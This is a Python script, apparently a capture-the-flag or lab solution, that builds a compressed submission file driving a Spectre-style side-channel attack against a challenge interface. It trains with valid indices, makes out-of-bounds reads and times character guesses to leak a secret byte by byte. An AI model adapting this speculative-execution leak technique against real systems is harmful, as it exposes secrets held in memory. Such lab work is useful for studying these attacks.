import numpy as np
from constants import *
import bz2
import argparse
class Attacker:
    def __init__( self, filename ):
        self.txt = ""
        self.filename = filename 
        self.temp = open("submission.txt",'wt')
    def compress( self ):
        o = open("submission.txt", 'rb')
        txt = o.read() 
        comp = bz2.BZ2Compressor()
        out = comp.compress( txt )
        out = out + comp.flush()
        f = open(self.filename, "wb")
        f.write( out )
        f.close()
    def flush(self ):
        self.temp.write( "0\n" )
        pass
    def multiple_sequence( self , sequence):
        self.temp.write( "7\n" ) 
        str_array = np.char.mod('%d', sequence)
        #combine to a string
        x_str = " ".join(str_array)
        self.temp.write( f"{x_str}\n")
    def read_sequence(self , seqId ):
        self.temp.write( f"4\n{seqId}\n")
        pass
    def read_star_id(self,star):
        self.temp.write( f"5\n{star}\n")
        pass
        
    def enable_timing( self, on ):
        if on:
            self.temp.write( "3\n")
        else:
            self.temp.write( "2\n")
    def stop( self ):
        self.temp.write( "1\n" )
        self.temp.close()
    def single_attack( self, nOutOfBounds , guessChar ):
        self.flush()

        badIndex = nOutOfBounds + MAX_VALID
        training_sequence = np.random.randint(0, MAX_VALID , size=N_TRAINING)
        self.multiple_sequence( training_sequence )
        
        # Do an out of bounds read
         
        self.read_sequence( badIndex )

        # Measure your guess
        self.enable_timing(True)
        
        self.read_star_id( guessChar )

        self.enable_timing(False)


    def sampled_attack(self,  nOutOfBounds , charGuess, trials ):
        for k in range( 0 , trials ):
            self.single_attack( nOutOfBounds , charGuess )
    def attack_bytes( self ):
        for byteNumber in range( 0, SECRET_LENGTH ):
            for charNumber in range( MIN_CHAR , MAX_CHAR ):
                self.sampled_attack( byteNumber , charNumber , N_TRIALS )
        self.stop()

if __name__ == "__main__":
    a = argparse.ArgumentParser()
    a.add_argument("--file" , required=True)
    args = a.parse_args()
    a = Attacker(args.file)
    a.attack_bytes()
    a.compress()
